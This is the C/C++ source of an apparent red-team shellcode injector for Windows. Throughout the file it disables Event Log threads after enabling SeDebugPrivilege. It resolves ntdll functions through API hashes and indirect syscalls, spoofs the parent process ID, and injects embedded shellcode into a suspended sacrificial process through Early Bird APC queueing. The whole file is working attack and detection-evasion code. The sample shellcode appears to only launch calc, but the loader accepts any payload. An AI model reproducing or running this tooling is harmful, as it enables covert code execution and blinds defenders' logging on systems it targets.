#include <stdio.h>
#include <stdlib.h>		// for strtol
#include <string>

#include "SyscallStuff.h"

// EventLogger Thread Kill
#include "SeDebugPrivilege.h"
#include "EventLog.h"

// If ran in Elevated Context, Kills Event Loggging threads
BOOL IfElevated()
//int main()
{
	// 1. WORK1

	// Update current process with SeDebugPrivilege Token (if admin priv)
	if (UpdatePriv(SE_DEBUG_NAME) == 0)
	{
		printf("\n[+] SeDebugPrivilege Enabled!\n");
	}
	else
	{
		// Exit!
		return -1;
	}

	printf("\n[*] Killing EventLog Threads (if running)\n");

	// Killing EventLog Threads from the responsible svchost.exe process

	if (KillEventLogThreads() == 0)
	{
		printf("\n[+] Ready for Post-Exp :)\n");
	}
	else
	{
		// Exit!
		printf("[!] Failed to Kill EventLog Service OR, EventLog Service NOT running!\n");

		// Assuming Event Log is NOT running!
		// Updating Global flag Value -> FALSE (as EventLog Service is Not running => No Need of restarting it)
		flag = FALSE;
		return flag;
	}
	return TRUE;
}


// ChatGPT: Create a custom hash generator more simple :)
// 
DWORD64 create_hash(PWSTR input_string)
{
	int hash_value = 0;

	// Iterate through each character in the input string
	for (int i = 0; input_string[i] != '\0'; i++)
	{
		// Add the ASCII value of the character to the hash_value
		hash_value += (int)input_string[i];
	}
	return hash_value;
}

PWSTR LPSTR_to_PWSTR(LPSTR pFuncName)
{
	// Get the required buffer size for the PWSTR string
	int bufferSize = MultiByteToWideChar(CP_ACP, 0, pFuncName, -1, NULL, 0);
	if (bufferSize == 0)
	{
		printf("Error in MultiByteToWideChar\n");
		return FALSE;
	}
	
	// Allocate memory for the PWSTR string
	PWSTR wideString = (PWSTR)malloc(bufferSize * sizeof(WCHAR));
	if (wideString == NULL)
	{
		printf("Memory allocation failed\n");
		return FALSE;
	}

	// Convert LPSTR to PWSTR
	int result = MultiByteToWideChar(CP_ACP, 0, pFuncName, -1, wideString, bufferSize);
	if (result == 0)
	{
		printf("Error in MultiByteToWideChar\n");
		free(wideString);
		return FALSE;
	}

	// Print the result
	//wprintf(L"PWSTR string: %ls\n", wideString);

	return wideString;

	//free(wideString);

}

LPVOID ResolveNtAPI(HMODULE DllBase, DWORD64 passedHash)
{
	printf("\t[+] BaseDll addr: %p\n", DllBase);

	// region Start: DOS_HEADER
	IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)DllBase;
	// endregion End: DOS_HEADER

	// region Start: NT_HEADERS => Accessing the last member of DOS Header (e_lfanew) to get the entry point for NT Header
	IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((LPBYTE)DllBase + DOS_HEADER->e_lfanew);
	// endregion Start: NT_HEADERS

	// Getting the Size of ntdll
	//SIZE_T ntdllsize = NT_HEADER->OptionalHeader.SizeOfImage;

	// Loading loaded DllBase Address from: 
	// 
	// Method2:
	// 
	// Optional Header (IMAGE_OPTIONAL_HEADER64 struture) -> present in winnt.h file

	/*
	typedef struct _IMAGE_OPTIONAL_HEADER64 {
		...
		...
		...
		DWORD AddressOfEntryPoint;
		...
		...
		...
		ULONGLONG ImageBase;
		...
		...
		...
		IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
	} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;
	*/
	//IMAGE_OPTIONAL_HEADER64* ImageBase = (IMAGE_OPTIONAL_HEADER64*)(NT_HEADER->OptionalHeader.ImageBase + NT_HEADER->OptionalHeader.AddressOfEntryPoint);
	//printf("[+] BaseDllName: %ws (addr: %p)\n", BaseDllName, ImageBase);

	//IMAGE_DATA_DIRECTORY* DataDirectory = (IMAGE_DATA_DIRECTORY*)((LPBYTE)DllBase + NT_HEADER->OptionalHeader.DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES].VirtualAddress);

	//DWORD*	AddressOfFunctions = (DWORD*)((LPBYTE)DllBase + DataDirectory->)
	//DWORD*	AddressOfNames = 
	//DWORD*	AddressOfNameOrdinals = 

	PIMAGE_EXPORT_DIRECTORY EXdir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)DllBase + NT_HEADER->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD fAddr = (PDWORD)((LPBYTE)DllBase + EXdir->AddressOfFunctions);
	PDWORD fNames = (PDWORD)((LPBYTE)DllBase + EXdir->AddressOfNames);
	PWORD  fOrdinals = (PWORD)((LPBYTE)DllBase + EXdir->AddressOfNameOrdinals);
	
	//printf("\tfAddr: %p\n", fAddr);
	//printf("\tfNames: %p\n", fNames);
	//printf("\tfOrdinals: %p\n", fOrdinals);

	// Looping:
	for (DWORD i = 0; i < EXdir->AddressOfFunctions; i++)
	{
		LPSTR pFuncName = (LPSTR)((LPBYTE)DllBase + fNames[i]);
		
		PWSTR pwFuncName = LPSTR_to_PWSTR(pFuncName);
		
		DWORD64 hash = create_hash(pwFuncName);

		if (hash == passedHash)
		{
			printf("Hash value matched and calculated as: %ld", passedHash);
			//printf("[+] FuncName: %s\n", pFuncName);
			return (LPVOID)((LPBYTE)DllBase + fAddr[fOrdinals[i]]);
		}
		//printf("[+] FuncName: %s\n", pFuncName);
	}
	return 0;
}

HMODULE ResolveDLL(int passedHash)
{
	// Init some important stuff
	PNT_TIB pTIB = NULL;
	PTEB pTEB = NULL;
	PPEB pPEB = NULL;

	// ==========================  Directly via offset (from TIB) -> TEB -> PEB ==============================================

	// Get pointer to the TEB
	// __readgsqword :
	// It is MSVC compiler intrinsic that reads memory from GS segment at specified offset.

	
	// Method1:


	// Refer: https://en.wikipedia.org/wiki/Win32_Thread_Information_Block
	//
	// In link, Refer Table: Contents of the TIB on Windows: 7th Row
	pTIB = (PNT_TIB)__readgsqword(0x30);
	pTEB = (PTEB)pTIB->Self;

	// Refer: https://en.wikipedia.org/wiki/Win32_Thread_Information_Block
	//
	// In link, Refer Table: Contents of the TIB on Windows: 9th Row
	//DWORD PID = (DWORD)__readgsqword(0x40);
	//printf("\n[+] PID from TEB: %ld\n", PID);

	// Get pointer to the PEB
	pPEB = (PPEB)pTEB->ProcessEnvironmentBlock;
	if (pPEB == NULL)
	{
		printf("\n[!] Unable to get ptr to PEB (%u)\n", GetLastError());
		return NULL;
	}
	else
	{
		//printf("\n[+] Got pPEB: Directly via offset (from TIB) -> TEB -> PEB: %X\n", pPEB);
		printf("\n[+] Got pPEB: Directly via offset (from TIB) -> TEB -> PEB\n\n");
	}

	// ========================== End: Directly via offset (from TIB) ==============================================
	/*
	printf("\t\tOR\n");

	// ========================== Directly via offset (from TIB) -> PEB ==============================================

	
	// Method2:


	// Refer: https://en.wikipedia.org/wiki/Win32_Thread_Information_Block
	//
	// In link, Refer Table: Contents of the TIB on Windows: 7th Row
	PPEB pPEB2 = (PPEB)__readgsqword(0x60);
	if (pPEB2 == NULL)
	{
		printf("Unable to get ptr to PEB\n");
		return 1;
	}
	else
	{
		printf("\n[+] Got pPEB: Directly via offset (from TIB) -> PEB\n");
	}

	// ========================== End: Directly via offset (from TIB) -> PEB ==============================================
	*/

	// Storing pointer to PEB_LDR_DATA:
	PPEB_LDR_DATA pPEB_LDR_DATA = (PPEB_LDR_DATA)(pPEB->Ldr);

	PLIST_ENTRY ListHead, ListEntry;
	PLDR_DATA_TABLE_ENTRY LdrEntry;

	// Code Taken From: https://doxygen.reactos.org/d7/d55/ldrapi_8c_source.html#l01124
	ListHead = &pPEB->Ldr->InLoadOrderModuleList;
	ListEntry = ListHead->Flink;
	int c = 0;
	while (ListHead != ListEntry)
	{
		/* Get the entry */
		LdrEntry = CONTAINING_RECORD(ListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		// Loading loaded DllBase Address from:
		// 
		// Method1:
		// 
		// Loader Data Table Entry (LDR_DATA_TABLE_ENTRY struture) -> present in ntapi.h file

		//UNICODE_STRING FullDllName = (UNICODE_STRING)(LdrEntry->FullDllName);
		UNICODE_STRING BaseDllName = (UNICODE_STRING)(LdrEntry->BaseDllName);
		//PVOID DllBase = (PVOID)(LdrEntry->DllBase);
		HMODULE DllBase = (HMODULE)(LdrEntry->DllBase);

		// Thanks to @D1rkMtr
		/*
		typedef struct _UNICODE_STRING {
			USHORT Length;
			USHORT MaximumLength;
			PWSTR  Buffer;
		} UNICODE_STRING, *PUNICODE_STRING;
		*/

		//printf("FullDllName: %ws\n", FullDllName.Buffer);
		//printf("BaseDllName: %ws (addr: %p)\n", BaseDllName.Buffer, DllBase);

		/*
		// Everytime ntdll.dll will be 2nd to load

		if (c == 1)
		{
			return DllBase;
		}
		c++;
		*/

		// ================================== Checking Passed API hash ==================================
		DWORD64 retrievedhash = create_hash(BaseDllName.Buffer);

		//printf("retrievedhash: %d\n", retrievedhash);
		//printf("BaseDllName: %ws (addr: %p)\n\n", BaseDllName.Buffer, DllBase);
		
		if (retrievedhash == passedHash)
		{
			printf("Hash value matched and calculated as: %d\n", retrievedhash);
			printf("BaseDllName: %ws (addr: %p)\n\n", BaseDllName.Buffer, DllBase);
			return DllBase;
		}

		// ================================== End: Checking Passed API hash ==================================

		/* Advance to the next module */
		ListEntry = ListEntry->Flink;
	}

	return 0;
}

// hash:
// ntdll.dll: 904
// NtAllocateVirtualMemory: 2375
// NtWriteVirtualMemory: 2093
// NtProtectVirtualMemory: 2307
// NtDelayExecution: 1637
// NtQueueApcThread: 1587

int main(int argc, char** argv)
{
	if (argc < 2)
	{
		printf("[!] Wrong!\n");
		printf("[->] Syntax: .\\%s <PPID to spoof>\n\n", argv[0]);
		return 1;
	}

	// PPID to Spoof
	char* p;
	int ppid = strtol(argv[1], &p, 10);


	// Kill Event Log Service If Elevated
	BOOL FLAG = IfElevated();
	if (FLAG == FALSE)
	{	
		// We shouldn't Restart the EventLog
		flag = FLAG;
	}

	// Define the shellcode to be injected
	unsigned char enc_shellcode_bin[] = "\xFC\x48\x83\xE4\xF0\xE8\xC0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x8B\x80\x88\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A\x48\x8B\x12\xE9\x57\xFF\xFF\xFF\x5D\x48\xBA\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8D\x8D\x01\x01\x00\x00\x41\xBA\x31\x8B\x6F\x87\xFF\xD5\xBB\xE0\x1D\x2A\x0A\x41\xBA\xA6\x95\xBD\x9D\xFF\xD5\x48\x83\xC4\x28\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5\x63\x61\x6C\x63\x00";

	PVOID BaseAddress = NULL;
	unsigned int shellcode_size = sizeof(enc_shellcode_bin);

	// SIZE_T shellcode variable for NT api operation
	SIZE_T shellcode_size2 = sizeof(enc_shellcode_bin);
	ULONG shcSize = (ULONG)shellcode_size;

	WORD syscallNum = NULL;
	INT_PTR syscallAddress = NULL;
	
	/* Target Spawned Remote Sacrificial Process: Early Bird APC PInjection : Thanks to reenz0h(twitter : @SEKTOR7net) */

	// Intializing some important stuff
	STARTUPINFOEXA sie;
	PROCESS_INFORMATION pi;
	ZeroMemory(&sie, sizeof(sie));
	ZeroMemory(&pi, sizeof(pi));

	// Required for a STARTUPINFOEXA
	sie.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	sie.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

	// Process Mitigation Policy:

	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE hParentProc = NULL;

	// Enable blocking of non-Microsoft signed DLLs and ACG mitigation policy
	DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;

	/*
	// ================ NtOpenProcess() =============================

	LPVOID pNtOpenProcess = GetProcAddress(GetModuleHandleA(ntdll), (LPCSTR)sNtOpenProcess);

	syscallNum = SortSSN(pNtOpenProcess);
	syscallAddress = GetsyscallInstr(pNtOpenProcess);

	// Indirect Syscall
	GetSyscall(syscallNum);
	GetSyscallAddr(syscallAddress);

	// Initializing OBJECT_ATTRIBUTES and CLIENT_ID struct
	OBJECT_ATTRIBUTES pObjectAttributes;
	InitializeObjectAttributes1(&pObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID pClientId;
	pClientId.UniqueProcess = (PVOID)ppid;
	pClientId.UniqueThread = (PVOID)0;

	// Opening a handle to the parent process to enable PPID spoofing
	NTSTATUS NtOpenProcessstatus = NtOpenProcess(&hParentProc, PROCESS_CREATE_PROCESS, &pObjectAttributes, &pClientId);

	if (!NT_SUCCESS(NtOpenProcessstatus))
	{
		printf("[!] Failed in NtOpenProcessstatus (%u)\n", GetLastError());
		return 1;
	}
	else
	{
		if (hParentProc == NULL)
		{
			return 1;
		}
		printf("\t=> Called NtOpenProcessstatus\n");
	}
	*/

	// ================ End: NtOpenProcess() =============================

	// Obfuscated Winapi in Init.h

	using OpenProcessPrototype = HANDLE(WINAPI*)(DWORD, BOOL, DWORD);
	OpenProcessPrototype OpenProcess = (OpenProcessPrototype)GetProcAddress(GetModuleHandleA(kernel32), sOpenProcess);

	hParentProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)ppid);

	if (hParentProc == NULL)
	{
		printf("[!] Failed to get handle Parent Process (%u)\n", GetLastError());
		return 1;
	}

	

	// Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated
	SIZE_T size = 0;
	InitializeProcThreadAttributeList(NULL, 2, 0, &size);

	// Allocate memory for PROC_THREAD_ATTRIBUTE_LIST
	sie.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

	// Initialise our list 
	InitializeProcThreadAttributeList(sie.lpAttributeList, 2, 0, &size);

	// Assign PPID Spoof attribute
	UpdateProcThreadAttribute(sie.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProc, sizeof(HANDLE), NULL, NULL);

	// Setting our new process with 2 Mitigation Policies: BlockDLL (CIG) + ACG(Arbitary Control Guard) 
	UpdateProcThreadAttribute(sie.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(HANDLE), NULL, NULL);

	// Obfuscated Winapi:

	using SuspendThreadPrototype = DWORD(WINAPI*)(HANDLE);
	SuspendThreadPrototype SuspendThread = (SuspendThreadPrototype)GetProcAddress(GetModuleHandleA(kernel32), sSuspendThread);

	using CreateProcessAPrototype = BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
	CreateProcessAPrototype CreateProcessA = (CreateProcessAPrototype)GetProcAddress(GetModuleHandleA(kernel32), sCreateProcessA);

	// Instead of Suspending Spawned process:
	// Suspend primary Thread of a Spawned process just to get around detection, or for normal signature Evasion...

	if (!CreateProcessA((LPSTR)SPAWN, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sie.StartupInfo, &pi))
	{
		printf("[!] Failed to Spawn Sacrificial process (%u)\n", GetLastError());
		return 1;
	}
	else
	{
		printf("\n[*] Spawning Sacrificial Process: %s (PID: %d)...\n\n", SPAWN, pi.dwProcessId);
	}

	// Get handle to process and primary thread
	HANDLE hProcess = pi.hProcess;
	HANDLE hThread = pi.hThread;

	// Suspend the primary thread
	SuspendThread(hThread);

	//getchar();

	// ================ NtAllocateVirtualMemory() =============================
	
	// Resolve ntdll.dll address from API hash:
	HMODULE hDLL = ResolveDLL(904);

	//LPVOID pNtAlloc = GetProcAddress(hDLL, (LPCSTR)NtAlloc);

	// Resolve API address:
	LPVOID pNtAlloc = ResolveNtAPI(hDLL, 2375);

	syscallNum = SortSSN(pNtAlloc);
	syscallAddress = GetsyscallInstr(pNtAlloc);

	// Indirect Syscall
	GetSyscall(syscallNum);
	GetSyscallAddr(syscallAddress);
	GetSyscallAddr(syscallAddress);

	NTSTATUS status1 = NtAllocateVirtualMemory(hProcess, &BaseAddress, 0, &shellcode_size2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!NT_SUCCESS(status1))
	{
		printf("[!] Failed in NtAllocateVirtualMemory (%u)\n", GetLastError());
		return 1;
	}
	else
	{
		printf("\t=> Called NtAllocateVirtualMemory\n");
	}

	// ================ End: NtAllocateVirtualMemory() =============================


	// ================ NtWriteVirtualMemory() =================================

	//LPVOID pNtWrite = GetProcAddress(hDLL, (LPCSTR)NtWrite);

	// Resolve API address:
	LPVOID pNtWrite = ResolveNtAPI(hDLL, 2093);

	syscallNum = SortSSN(pNtWrite);
	syscallAddress = GetsyscallInstr(pNtWrite);

	// Indirect Syscall
	GetSyscall(syscallNum);
	GetSyscallAddr(syscallAddress);

	NTSTATUS  NtWriteStatus1 = NtWriteVirtualMemory(hProcess, BaseAddress, enc_shellcode_bin, shcSize, NULL);

	if (!NT_SUCCESS(NtWriteStatus1))
	{
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return 1;
	}
	else
	{
		printf("\t=> Called NtWriteVirtualMemory\n");
	}

	// ================ End: NtWriteVirtualMemory() =================================

	// ========================= NtProtectVirtualMemory() =============================

	DWORD OldProtect = 0;

	//LPVOID pNtProtect = GetProcAddress(hDLL, (LPCSTR)NtProtect);

	// Resolve API address:
	LPVOID pNtProtect = ResolveNtAPI(hDLL, 2307);

	syscallNum = SortSSN(pNtProtect);
	syscallAddress = GetsyscallInstr(pNtProtect);

	// Indirect Syscall
	GetSyscall(syscallNum);
	GetSyscallAddr(syscallAddress);

	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hProcess, &BaseAddress, &shellcode_size2, PAGE_EXECUTE_READ, &OldProtect);

	if (!NT_SUCCESS(NtProtectStatus1))
	{
		printf("[!] Failed in NtProtectVirtualMemory (%u)\n", GetLastError());
		return 1;
	}
	else
	{
		printf("\t=> Called NtProtectVirtualMemory\n");
	}

	// ========================= End: NtProtectVirtualMemory() =============================

	// ========================= For Debugging ==============================================

	// Just Uncomment this and compile -> Execute and open the implant process in process hacker -> check thread Stack -> It's totally Legit 
	// 
	// 1. Top of the stack will indeed show ntoskrnl.exe as 
	// => ProcessHacker has a Driver inbuilt which will see beyond the call to ntdll and into ntoskrnl (kernel)
	// 
	// 2. Compared with legit cmd process, stack looks identical 
	//		i. => Nt functions are present at the top of the Stack (Leaving, the "ntoskrnl.exe is on TOP of CallStack" factor)
	// 
	//		ii. => Nt functions are retrieved from ntdll itself, NOT from implant process 

	LARGE_INTEGER SleepUntil;
	//LARGE_INTEGER SleepTo;

	//const char NtDelay[] = { 'N','t','D','e','l','a','y','E','x','e','c','u','t','i','o','n', 0 };

	//LPVOID pNtDelay = GetProcAddress(hDLL, NtDelay);

	// Resolve API address:
	LPVOID pNtDelay = ResolveNtAPI(hDLL, 1637);

	syscallNum = SortSSN(pNtDelay);
	syscallAddress = GetsyscallInstr(pNtDelay);

	// Indirect Syscall
	GetSyscall(syscallNum);
	GetSyscallAddr(syscallAddress);

	//DWORD ms = 1000000;
	//DWORD ms = 10;
	DWORD ms = 10000;

	// Code: https://evasions.checkpoint.com/techniques/timing.html
	GetSystemTimeAsFileTime((LPFILETIME)&SleepUntil);
	SleepUntil.QuadPart += (ms * 10000);

	NTSTATUS NTDelaystatus = NtDelayExecution(TRUE, &SleepUntil);

	if (!NT_SUCCESS(NTDelaystatus))
	{
		printf("[!] Failed in NtDelayExecution (%u)\n", GetLastError());
		return 1;
	}
	else
	{
		printf("\t=> Called NtDelayExecution\n");
	}

	// ========================= End: For Debugging ==============================================

	/*
	// ============================= NtCreateThreadEx() ====================================

	LPVOID pNtCreateTh = GetProcAddress(GetModuleHandleA(ntdll), NtCreateTh);

	syscallNum = SortSSN(pNtCreateTh);
	syscallAddress = GetsyscallInstr(pNtCreateTh);

	// Indirect Syscall
	GetSyscall(syscallNum);
	GetSyscallAddr(syscallAddress);

	NTSTATUS NtCreateThreadstatus = NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, MyCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	if (!NT_SUCCESS(NtCreateThreadstatus))
	{
		printf("[!] Failed in NtCreateThreadEx (%u)\n", GetLastError());
		return 1;
	}

	// ============================= End: NtCreateThreadEx() ====================================

	// ============================== NtWaitForSingleObject() ====================================

	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;

	LPVOID pNtWait = GetProcAddress(GetModuleHandleA(ntdll), NtWait);

	syscallNum = SortSSN(pNtWait);
	syscallAddress = GetsyscallInstr(pNtWait);

	// Indirect Syscall
	GetSyscall(syscallNum);
	GetSyscallAddr(syscallAddress);

	NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hThread, FALSE, &Timeout);
	
	if (!NT_SUCCESS(NTWFSOstatus))
	{
		printf("[!] Failed in NtWaitForSingleObject (%u)\n", GetLastError());
		return 1;
	}

	getchar();

	// ============================== End: NtWaitForSingleObject() =================================
	*/

	// ============================== NtQueueApcThread =============================================

	// Assigning the APC to the primary thread

	//LPVOID pNtQueueApcThread = GetProcAddress(hDLL, (LPCSTR)sNtQueueApcThread);

	// Resolve API address:
	LPVOID pNtQueueApcThread = ResolveNtAPI(hDLL, 1587);

	syscallNum = SortSSN(pNtQueueApcThread);
	syscallAddress = GetsyscallInstr(pNtQueueApcThread);

	// Indirect Syscall
	GetSyscall(syscallNum);
	GetSyscallAddr(syscallAddress);

	LPVOID pAlloc = BaseAddress;

	NTSTATUS NtQueueApcThreadStatus1 = NtQueueApcThread(hThread, (PIO_APC_ROUTINE)pAlloc, pAlloc, NULL, NULL);

	if (!NT_SUCCESS(NtQueueApcThreadStatus1))
	{
		printf("[!] Failed in NtQueueApcThread (%u)\n", GetLastError());
		return 1;
	}
	else
	{
		printf("\t=> Called NtQueueApcThread\n");
	}

	// ============================== End: NtQueueApcThread =============================================

	// Resume the thread
	DWORD ret = ResumeThread(pi.hThread);
	if (ret == 0XFFFFFFFF)
	{
		return 1;
	}
	
	/*
	// If EventLog Intially ran Before execution of our Implant
	if (flag == TRUE)
	{
		// Restarting/Reviving EventLog Service
		if (RestartEventLogService() != 0)
		{
			printf("[!] Failed to restart EventLog Service (%u)\n", GetLastError());
			return 1;
		}
	}
	
	//printf("flag: %s", flag ? "TRUE" : "FALSE");
	*/

	return 0;
}